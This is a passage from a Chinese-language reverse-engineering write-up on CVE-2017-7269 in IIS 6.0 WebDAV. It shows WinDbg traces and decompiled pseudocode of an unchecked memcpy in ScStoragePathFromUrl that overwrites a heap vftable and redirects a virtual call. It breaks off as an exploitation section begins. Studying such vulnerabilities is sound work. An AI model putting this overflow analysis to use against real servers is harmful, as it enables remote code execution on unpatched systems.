0060e7e0&nbsp;&nbsp;61757948&nbsp;6f674f43&nbsp;48456b6f&nbsp;67753646&nbsp;&nbsp;HyuaCOgookEHF6ug</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">经过一系列的检查之后，会进入一系列的memcpy函数，主要就是用来构造虚拟文件路径，这个地方拷贝的长度没有进行控制，而拷贝的目标地址，是在外层函数调用stackbuff申请的地址，这个地址会保存在栈里。在ScStorageFromUrl函数中用到，也就是在memcpy函数中用到，作为目的拷贝的地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ScStorageFromUrl函数中实际上在整个漏洞触发过程中会调用很多次，我们跟踪的这一次，是在漏洞利用中的一个关键环节之一。首先我们来看一下第一次有效的memcpy</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000009&nbsp;edx=00000024&nbsp;esi=00000012&nbsp;edi=680312c0
eip=67126fa9&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
httpext!ScStoragePathFromUrl+0x32e:
67126fa9&nbsp;8db5c4fbffff&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,[ebp-43Ch]
0:009&gt;&nbsp;p
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000009&nbsp;edx=00000024&nbsp;esi=00fff35c&nbsp;edi=680312c0
eip=67126faf&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
httpext!ScStoragePathFromUrl+0x334:
67126faf&nbsp;f3a5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;dword&nbsp;ptr&nbsp;es:[edi],dword&nbsp;ptr&nbsp;[esi]
0:009&gt;&nbsp;r&nbsp;esi
esi=00fff35c
0:009&gt;&nbsp;dc&nbsp;esi
00fff35c&nbsp;&nbsp;003a0063&nbsp;0069005c&nbsp;0065006e&nbsp;00700074&nbsp;&nbsp;c.:.\.i.n.e.t.p.
00fff36c&nbsp;&nbsp;00620075&nbsp;0077005c&nbsp;00770077&nbsp;006f0072&nbsp;&nbsp;u.b.\.w.w.w.r.o.
00fff37c&nbsp;&nbsp;0074006f&nbsp;0062005c&nbsp;00620062&nbsp;00620062&nbsp;&nbsp;o.t.\.b.b.b.b.b.
00fff38c&nbsp;&nbsp;00620062&nbsp;61757948&nbsp;6f674f43&nbsp;48456b6f&nbsp;&nbsp;b.b.HyuaCOgookEH</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这次memcpy拷贝过程中，会将esi寄存器中的值拷贝到edi寄存器中，可以看到edi寄存器的值是0x680312c0，这个值很有意思，在之前我提到过，这个buffer的值会在外层函数中申请，并存放在栈中，因此正常情况应该是向一个栈地址拷贝，而这次为什么会向一个堆地址拷贝呢？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这是个悬念，也是我觉得这个利用巧妙的地方，下面我们先进入后面的分析，在memcpy中，也就是rep movs中ecx的值决定了memcpy的长度，第一次拷贝的长度是0x9。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来，回进入第二次拷贝，这次拷贝的长度就比较长了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p//长度相减，0x2fd－0x0
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000000&nbsp;edx=00000000&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fc4&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStoragePathFromUrl+0x349:
67126fc4&nbsp;2bda&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,edx
0:009&gt;&nbsp;r&nbsp;ebx
ebx=000002fd
0:009&gt;&nbsp;r&nbsp;edx
edx=00000000
0:009&gt;&nbsp;p
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000000&nbsp;edx=00000000&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fc6&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x34b:
67126fc6&nbsp;8d3456&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,[esi+edx*2]
0:009&gt;&nbsp;p
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000000&nbsp;edx=00000000&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fc9&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x34e:
67126fc9&nbsp;8b95b0fbffff&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[ebp-450h]&nbsp;ss:0023:00fff348=680312c0
0:009&gt;&nbsp;p
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000000&nbsp;edx=680312c0&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fcf&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x354:
67126fcf&nbsp;8d3c10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,[eax+edx]
0:009&gt;&nbsp;p/／ecx的值为dword值
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=00000000&nbsp;edx=680312c0&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fd2&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x357:
67126fd2&nbsp;8d4c1b02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,[ebx+ebx+2]
0:009&gt;&nbsp;p
eax=00000024&nbsp;ebx=000002fd&nbsp;ecx=000005fc&nbsp;edx=680312c0&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fd6&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x35b:
67126fd6&nbsp;8bc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,ecx
0:009&gt;&nbsp;p／／最后拷贝的长度再除以4
eax=000005fc&nbsp;ebx=000002fd&nbsp;ecx=000005fc&nbsp;edx=680312c0&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fd8&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x35d:
67126fd8&nbsp;c1e902&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,2
0:009&gt;&nbsp;p/／这次拷贝17f的值&nbsp;key！！！看ecx
eax=000005fc&nbsp;ebx=000002fd&nbsp;ecx=0000017f&nbsp;edx=680312c0&nbsp;esi=0060e7d0&nbsp;edi=680312e4
eip=67126fdb&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x360:
67126fdb&nbsp;f3a5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;dword&nbsp;ptr&nbsp;es:[edi],dword&nbsp;ptr&nbsp;[esi]</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到，这次拷贝的长度是0x17f，长度非常大，而在整个分析的过程中，并没有对拷贝的长度进行控制，因此，可以拷贝任意超长的字符串，进入这个堆空间。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个堆空间非常有意思，存放的是一个vftable，这个vftable会在ScStorageFromUrl函数中的某个内层函数调用调用到，还记得之前分析的ScStripAndCheckHttpPrefi函数吗。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p//正常情况ScStripAndCheckHttpPrefix函数中对vftable的获取
eax=00fff9a4&nbsp;ebx=00fffbe8&nbsp;ecx=00605740&nbsp;edx=00fff4f8&nbsp;esi=0060c648&nbsp;edi=00605740
eip=671335e8&nbsp;esp=00fff4b8&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStripAndCheckHttpPrefix+0x13:
671335e8&nbsp;8b07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edi]&nbsp;&nbsp;ds:0023:00605740={httpext!CEcb::`vftable&#39;&nbsp;(67113bc8)}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">获取完虚表之后，会获取到对应的虚函数，在ScStripAndCheckHttpPrefix函数中call调用到。但是由于之前的memcpy覆盖，导致这个vftable被覆盖。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=680313c0&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=671335f0&nbsp;esp=00fff4b4&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStripAndCheckHttpPrefix+0x1b:
671335f0&nbsp;8955f4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-0Ch],edx&nbsp;ss:0023:00fff4c4=00000000
0:009&gt;&nbsp;p//eax是vftable，而call&nbsp;[eax+24]调用虚函数，这里由于之前的覆盖，导致跳转到可控位置
eax=680313c0&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=671335f3&nbsp;esp=00fff4b4&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStripAndCheckHttpPrefix+0x1e:
671335f3&nbsp;ff5024&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[eax+24h]&nbsp;&nbsp;ds:0023:680313e4=68016082
0:009&gt;&nbsp;dc&nbsp;eax
680313c0&nbsp;&nbsp;680313c0&nbsp;68006e4f&nbsp;68006e4f&nbsp;766a4247&nbsp;&nbsp;...hOn.hOn.hGBjv
680313d0&nbsp;&nbsp;680313c0&nbsp;4f744257&nbsp;52345947&nbsp;4b424b66&nbsp;&nbsp;...hWBtOGY4RfKBK</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个漏洞的原理非常简单，在PROPFIND中，由于对http的长度没有进行检查，导致在memcpy中，可以拷贝超长的字符串，覆盖到栈中的关键位置，下面来看一下伪代码。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">__int32&nbsp;__fastcall&nbsp;ScStoragePathFromUrl(const&nbsp;struct&nbsp;IEcb&nbsp;*a1,&nbsp;wchar_t&nbsp;*a2,&nbsp;unsigned&nbsp;__int16&nbsp;*a3,&nbsp;unsigned&nbsp;int&nbsp;*a4,&nbsp;struct&nbsp;CVRoot&nbsp;**a5)
{
&nbsp;&nbsp;v35&nbsp;=&nbsp;a3;
&nbsp;&nbsp;v5&nbsp;=&nbsp;a1;
&nbsp;&nbsp;Str&nbsp;=&nbsp;a2;
&nbsp;&nbsp;v37&nbsp;=&nbsp;(int)a1;
&nbsp;&nbsp;v34&nbsp;=&nbsp;a4;
&nbsp;&nbsp;v33&nbsp;=&nbsp;a5;
&nbsp;&nbsp;result&nbsp;=&nbsp;ScStripAndCheckHttpPrefix(a1,&nbsp;(const&nbsp;unsigned&nbsp;__int16&nbsp;**)&amp;Str);//主要用来检查开头信息，比如http头以及host等等
&nbsp;&nbsp;if&nbsp;(&nbsp;result&nbsp;&lt;&nbsp;0&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result;
&nbsp;&nbsp;if&nbsp;(&nbsp;*Str&nbsp;!=&nbsp;47&nbsp;)//判断第一个值是不是/
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-2146107135;
&nbsp;&nbsp;v7&nbsp;=&nbsp;_wcslen(Str);//获取str长度，也就是畸形url长度
&nbsp;&nbsp;result&nbsp;=&nbsp;IEcbBase::ScReqMapUrlToPathEx(Str,&nbsp;WideCharStr);
&nbsp;&nbsp;v36&nbsp;=&nbsp;result;
&nbsp;&nbsp;if&nbsp;(&nbsp;result&nbsp;&lt;&nbsp;0&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result;
&nbsp;&nbsp;v8&nbsp;=&nbsp;(*(int&nbsp;(__thiscall&nbsp;**)(const&nbsp;struct&nbsp;IEcb&nbsp;*,&nbsp;wchar_t&nbsp;**))(*(_DWORD&nbsp;*)v5&nbsp;+&nbsp;52))(v5,&nbsp;&amp;Str1);//httpext!CEcbBaseImpl&lt;IEcb&gt;::CchGetVirtualRootW&nbsp;(6712d665)&nbsp;获取虚拟路径
&nbsp;&nbsp;if&nbsp;(&nbsp;v8&nbsp;==&nbsp;v42&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v8&nbsp;||&nbsp;Str[v8&nbsp;-&nbsp;1]&nbsp;&amp;&amp;&nbsp;!__wcsnicmp(Str1,&nbsp;Str,&nbsp;v8)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_14;
&nbsp;&nbsp;}
&nbsp;&nbsp;else&nbsp;if&nbsp;(&nbsp;v8&nbsp;+&nbsp;1&nbsp;==&nbsp;v42&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;Str[v8];
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v9&nbsp;==&nbsp;47&nbsp;||&nbsp;!v9&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--v42;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_14;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;v36&nbsp;=&nbsp;1378295;
LABEL_14:
&nbsp;&nbsp;if&nbsp;(&nbsp;v36&nbsp;==&nbsp;1378295&nbsp;&amp;&amp;&nbsp;a5&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;……
&nbsp;&nbsp;}
&nbsp;&nbsp;v16&nbsp;=&nbsp;v41;
&nbsp;&nbsp;if&nbsp;(&nbsp;v41&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;v17&nbsp;=&nbsp;(const&nbsp;unsigned&nbsp;__int16&nbsp;*)((char&nbsp;*)&amp;v39&nbsp;+&nbsp;2&nbsp;*&nbsp;v41&nbsp;+&nbsp;2);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*v17&nbsp;==&nbsp;92&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;v16&nbsp;&amp;&amp;&nbsp;*v17&nbsp;==&nbsp;92&nbsp;&amp;&amp;&nbsp;!FIsDriveTrailingChar(v17,&nbsp;v16)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v41&nbsp;=&nbsp;--v16;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--v17;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(&nbsp;!*v17&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v16&nbsp;=&nbsp;v41--&nbsp;-&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;v18&nbsp;=&nbsp;v16&nbsp;-&nbsp;v42&nbsp;+&nbsp;v7&nbsp;+&nbsp;1;
&nbsp;&nbsp;v19&nbsp;=&nbsp;*v34&nbsp;&lt;&nbsp;v18;
&nbsp;&nbsp;v37&nbsp;=&nbsp;v16&nbsp;-&nbsp;v42&nbsp;+&nbsp;v7&nbsp;+&nbsp;1;
&nbsp;&nbsp;if&nbsp;(&nbsp;v19&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;……
&nbsp;&nbsp;}
&nbsp;&nbsp;else//进入这一处else处理
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;v21&nbsp;=&nbsp;v35;
&nbsp;&nbsp;&nbsp;&nbsp;v22&nbsp;=&nbsp;v16;
&nbsp;&nbsp;&nbsp;&nbsp;v23&nbsp;=&nbsp;2&nbsp;*&nbsp;v16;
&nbsp;&nbsp;&nbsp;&nbsp;v24&nbsp;=&nbsp;(unsigned&nbsp;int)(2&nbsp;*&nbsp;v16)&nbsp;&gt;&gt;&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;qmemcpy(v35,&nbsp;WideCharStr,&nbsp;4&nbsp;*&nbsp;v24);//拷贝虚拟路径
&nbsp;&nbsp;&nbsp;&nbsp;v26&nbsp;=&nbsp;&amp;WideCharStr[2&nbsp;*&nbsp;v24];
&nbsp;&nbsp;&nbsp;&nbsp;v25&nbsp;=&nbsp;&amp;v21[2&nbsp;*&nbsp;v24];
&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v24)&nbsp;=&nbsp;v23;
&nbsp;&nbsp;&nbsp;&nbsp;v27&nbsp;=&nbsp;v42;
&nbsp;&nbsp;&nbsp;&nbsp;qmemcpy(v25,&nbsp;v26,&nbsp;v24&nbsp;&amp;&nbsp;3);
&nbsp;&nbsp;&nbsp;&nbsp;v28&nbsp;=&nbsp;v7&nbsp;-&nbsp;v27;//这里v7是0x2fd，相减赋值给v28，这个值很大，v27为0
&nbsp;&nbsp;&nbsp;&nbsp;v29&nbsp;=&nbsp;&amp;Str[v27];
&nbsp;&nbsp;&nbsp;&nbsp;v30&nbsp;=&nbsp;v35;
&nbsp;&nbsp;&nbsp;&nbsp;qmemcpy(&amp;v35[v22],&nbsp;v29,&nbsp;2&nbsp;*&nbsp;v28&nbsp;+&nbsp;2);//直接拷贝到栈中，没有对长度进行检查，导致溢出
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;i&nbsp;=&nbsp;&amp;v30[v41];&nbsp;*i;&nbsp;++i&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*i&nbsp;==&nbsp;47&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*i&nbsp;=&nbsp;92;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;*v34&nbsp;=&nbsp;v37;
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;v36;
&nbsp;&nbsp;}
&nbsp;&nbsp;return&nbsp;result;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">CVE-2017-7269 Exploit!精妙的漏洞利用</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">其实通过上面的分析，我们发现这个漏洞的 原理非常简单，但是究竟如何利用呢，我们来看一下关于ScStorageFromUrl函数中，包含了GS check，也就是说，我们在进行常规的覆盖ret方式利用的情况下，将会把cookie也会覆盖，导致利用失败。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre 